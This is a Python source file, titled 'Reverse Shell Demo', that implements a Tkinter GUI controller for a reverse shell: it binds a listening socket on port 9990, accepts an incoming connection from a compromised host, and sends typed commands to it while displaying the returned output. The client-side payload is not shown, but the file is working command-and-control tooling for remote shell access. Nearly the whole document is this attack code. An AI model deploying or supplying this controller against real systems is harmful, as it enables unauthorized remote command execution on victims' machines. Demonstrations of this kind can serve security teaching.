import socket
import sys
import os
from tkinter import *
from tkinter import ttk
global conn

def exception(e, s):
    print(s)
    print(e)
    exc_type, exc_obj, exc_tb = sys.exc_info()
    fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
    print(exc_type, fname, exc_tb.tb_lineno)

def exception(e, s):
    print(s)
    print(e)
    exc_type, exc_obj, exc_tb = sys.exc_info()
    fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
    print(exc_type, fname, exc_tb.tb_lineno)

def socket_create():
    try:
        
        print("in socket create")
        global host
        global port
        global s
        host = ''
        port = 9990
        s = socket.socket()
        socket_bind()
        
    except Exception as e:
        exception(e, "In socket_create()")

def socket_bind():
    try:
        
        print("in socket bind")
        global host
        global port
        global s
        print("Binding Socket to port : "+str(port))
        l2.configure(text=str("Binding Socket to port : "+str(port))) 
        s.settimeout(2)
        s.bind((host,port))
        s.listen(5)
        socket_accept()
        
    except Exception as e:
        exception(e, "In socket_bind()")
        return
        #print("Retrying...")
        #socket_bind()

def socket_accept():
    try:
        print("in socket accept")
        global conn
        try:
            conn, address = s.accept()
        except Exception as e:
            exception(e,"")
            s.close()
            l.configure(text="Socket not Connected",bg="red")
            l2.configure(text="")
            return
            
        print("Connection has been established | IP " + address[0] + " | Port " + str(address[1]))
        l.configure(text="Socket Connected",bg="green")
        l2.configure(text=str("Connection has been established | IP " + address[0] + " | Port " + str(address[1]))) 
        
        e1.focus()
        #send_commands(conn)
        return
        conn.close()
        
    except Exception as e:
        exception(e, "In socket_accept()")

def send_commands(event=""):
    try:
        global conn
        

        cmd = e1.get()
        e1.delete(0, 'end')
        
        
        if cmd == 'client quit':
            try:
                conn.send(str.encode("quit"))
                conn.close()
                s.close()
                l.configure(text="Socket not Connected",bg="red")
                l2.configure(text="")
                
            except:
                None
        if cmd == 'quit':
            try:
                conn.send(str.encode(cmd))
                conn.close()
                s.close()
            except:
                None
            master.destroy()
            
        if len(str.encode(cmd)) > 0:
            try:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480),'utf-8')
                print(client_response, end = '')
                l2.configure(text=client_response)   
            except :
                None
            
                
    except Exception as e:
        exception(e, "In send_commands()")
        

def main():
    socket_create()

try:
    master = Tk()
    master.title("Reverse Shell Demo")
    master.minsize(500, 500)
    
    labelFrame=ttk.LabelFrame(master,text="")
    labelFrame.pack(fill=X)

    b0 = Button(labelFrame, text = "Bind Socket",command=main, bg ="black",fg="white")
    b0.pack(side=LEFT)
    
    l = Label(labelFrame,text="Socket not Connected", bg = "red" , fg="white")
    l.pack(fill=X)
    
    labelFrame2=ttk.LabelFrame(master,text="")
    labelFrame2.pack(fill=X)
    
    master.bind('<Return>', send_commands)
    
    b1 = Button(labelFrame2, text = "Run Command",command=send_commands, bg ="gray",fg="white")
    b1.grid(row=4,column=5)
    
    Label(labelFrame2,text="Input").grid(row = 4,column = 0, padx=10,pady=20, sticky="w")
    
    e1 = Entry(labelFrame2)
    e1.grid(row = 4,column = 3, padx=10,pady=20 ,sticky="nsew")
    
    labelFrame2.grid_rowconfigure(4, weight=10)
    labelFrame2.grid_columnconfigure(3, weight=10)
    
    size_x = 500
    
    labelFrame3=ttk.LabelFrame(master,text="")
    labelFrame3.pack(fill=X)
    
    Label(labelFrame3,text="Output").grid(row = 4,column = 0, padx=5,pady=20, sticky="w")
    
    l2 = Label(labelFrame3,text="",wraplength=size_x)
    l2.grid(row = 4,column = 3, padx=10,pady=20 ,sticky="w")
    
    
    labelFrame3.grid_rowconfigure(4, weight=1)
    labelFrame3.grid_columnconfigure(3, weight=1)
    
    mainloop()
    
except Exception as e:
    exception(e,"in gui")